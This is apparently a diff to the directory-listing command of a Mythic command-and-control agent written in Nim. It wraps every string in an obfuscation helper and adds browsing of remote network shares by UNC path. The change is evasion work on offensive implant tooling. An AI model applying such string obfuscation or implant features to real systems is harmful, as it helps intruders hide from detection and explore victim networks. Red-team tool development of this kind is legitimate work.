@@ -1,5 +1,8 @@
-import json, os
-when defined(posix):
+import json, os, strutils
+import ../utils/strenc
+import ../utils/m_responses
+
+when defined(linux):
   import posix
 when defined(windows):
   import times
@@ -19,7 +22,7 @@ proc getFilePermissions(path: string): JsonNode =
   ## Get file permissions in Mythic format
   var acls = newJArray()
   
-  when defined(posix):
+  when defined(linux):
     var statBuf: Stat
     if stat(path.cstring, statBuf) == 0:
       # Convert Unix permissions to string format (rwxrwxrwx)
@@ -38,10 +41,10 @@ proc getFilePermissions(path: string): JsonNode =
       perms.add(if (statBuf.st_mode and S_IXOTH.Mode) != 0: 'x' else: '-')
       
       acls.add(%*{
-        "account": "owner",
-        "rights": perms,
-        "type": "Unix Permissions",
-        "is_inherited": false
+        obf("account"): obf("owner"),
+        obf("rights"): perms,
+        obf("type"): obf("Unix Permissions"),
+        obf("is_inherited"): false
       })
   else:
     # Windows - basic permissions
@@ -50,27 +53,27 @@ proc getFilePermissions(path: string): JsonNode =
       var rights = "rwx"  # Basic default for Windows
       
       acls.add(%*{
-        "account": "user",
-        "rights": rights,
-        "type": "Windows Permissions",
-        "is_inherited": false
+        obf("account"): obf("user"),
+        obf("rights"): rights,
+        obf("type"): obf("Windows Permissions"),
+        obf("is_inherited"): false
       })
     except:
       # Fallback if we can't get permissions
       acls.add(%*{
-        "account": "user",
-        "rights": "---",
-        "type": "Unknown",
-        "is_inherited": false
+        obf("account"): obf("user"),
+        obf("rights"): obf("---"),
+        obf("type"): obf("Unknown"),
+        obf("is_inherited"): false
       })
   
   result = %*{
-    "acl": acls
+    obf("acl"): acls
   }
 
 proc getFileOwner(path: string): string =
   ## Get file owner name
-  when defined(posix):
+  when defined(linux):
     var statBuf: Stat
     if stat(path.cstring, statBuf) == 0:
       # Try to get username from UID
@@ -89,11 +92,11 @@ proc getFileOwner(path: string): string =
 proc getFileInfoObj(path: string): FileInfo =
   ## Get detailed file information
   try:
-    when defined(posix):
+    when defined(linux):
       # Use stat directly for more reliable metadata
       var statBuf: Stat
       if stat(path.cstring, statBuf) != 0:
-        raise newException(OSError, "Failed to stat file")
+        raise newException(OSError, obf("Failed to stat file"))
       
       result.isFile = S_ISREG(statBuf.st_mode)
       result.permissions = getFilePermissions(path)
@@ -142,7 +145,7 @@ proc getFileInfoObj(path: string): FileInfo =
   except:
     # Fallback for files we can't access
     result.isFile = false
-    result.permissions = %*{"acl": []}
+    result.permissions = %*{obf("acl"): []}
     result.name = extractFilename(path)
     result.fullName = path
     result.accessTime = 0
@@ -156,8 +159,6 @@ proc getPlatform(): string =
     return "Windows"
   elif defined(linux):
     return "Linux"
-  elif defined(macosx):
-    return "macOS"
   else:
     return "Unknown"
 
@@ -168,24 +169,35 @@ proc executeLs*(params: JsonNode): JsonNode =
   var host = ""
   
   if params != nil:
-    if params.hasKey("path"):
-      let pathStr = params["path"].getStr()
+    if params.hasKey(obf("path")):
+      let pathStr = params[obf("path")].getStr()
       if pathStr.len > 0:
         targetPath = pathStr
-    if params.hasKey("host"):
-      host = params["host"].getStr()
+    if params.hasKey(obf("host")):
+      host = params[obf("host")].getStr()
   
   # Expand and validate path
   try:
-    if not targetPath.isAbsolute():
+    # Build UNC path if host is provided
+    if host.len > 0:
+      # Remove leading/trailing backslashes from path
+      var cleanPath = targetPath.strip(chars = {'\\', '/'})
+      # Build UNC path: \\host\share
+      targetPath = "\\\\" & host & "\\" & cleanPath
+    
+    # Handle UNC paths (\\\\server\\share) and absolute paths
+    when defined(windows):
+      # Normalize path separators for Windows
+      targetPath = targetPath.replace("/", "\\")
+    
+    if not targetPath.isAbsolute() and not targetPath.startsWith("\\\\\\\\"):
       targetPath = getCurrentDir() / targetPath
     
-    if not dirExists(targetPath):
-      return %*{
-        "user_output": "Error: Path does not exist or is not a directory: " & targetPath,
-        "completed": true,
-        "status": "error"
-      }
+    # For UNC paths, walkDir will fail if the path doesn't exist
+    # So we can skip the dirExists check for UNC paths
+    let isUNC = targetPath.startsWith("\\\\\\\\")
+    if not isUNC and not dirExists(targetPath):
+      return mythicError("", obf("Error: Path does not exist or is not a directory: ") & targetPath)
     
     # Build files list
     var filesList = newJArray()
@@ -193,14 +205,14 @@ proc executeLs*(params: JsonNode): JsonNode =
       try:
         let fileInfo = getFileInfoObj(path)
         filesList.add(%*{
-          "is_file": fileInfo.isFile,
-          "permissions": fileInfo.permissions,
-          "name": fileInfo.name,
-          "full_name": fileInfo.fullName,
-          "access_time": fileInfo.accessTime,
-          "modify_time": fileInfo.modifyTime,
-          "size": fileInfo.size,
-          "owner": fileInfo.owner
+          obf("is_file"): fileInfo.isFile,
+          obf("permissions"): fileInfo.permissions,
+          obf("name"): fileInfo.name,
+          obf("full_name"): fileInfo.fullName,
+          obf("access_time"): fileInfo.accessTime,
+          obf("modify_time"): fileInfo.modifyTime,
+          obf("size"): fileInfo.size,
+          obf("owner"): fileInfo.owner
         })
       except:
         # Skip files we can't access
@@ -213,24 +225,20 @@ proc executeLs*(params: JsonNode): JsonNode =
     # Build file browser response
     # Use 0 for directory-level timestamps (not individual files)
     result = %*{
-      "host": host,
-      "platform": getPlatform(),
-      "is_file": false,
-      "permissions": getFilePermissions(targetPath),
-      "name": dirName,
-      "parent_path": parentPath,
-      "success": true,
-      "access_time": 0,
-      "modify_time": 0,
-      "creation_date": 0,
-      "size": 0,
-      "update_deleted": true,
-      "files": filesList
+      obf("host"): host,
+      obf("platform"): getPlatform(),
+      obf("is_file"): false,
+      obf("permissions"): getFilePermissions(targetPath),
+      obf("name"): dirName,
+      obf("parent_path"): parentPath,
+      obf("success"): true,
+      obf("access_time"): 0,
+      obf("modify_time"): 0,
+      obf("creation_date"): 0,
+      obf("size"): 0,
+      obf("update_deleted"): true,
+      obf("files"): filesList
     }
     
   except Exception as e:
-    result = %*{
-      "user_output": "Error listing directory: " & e.msg,
-      "completed": true,
-      "status": "error"
-    }
+    result = mythicError("", obf("Error listing directory: ") & e.msg)
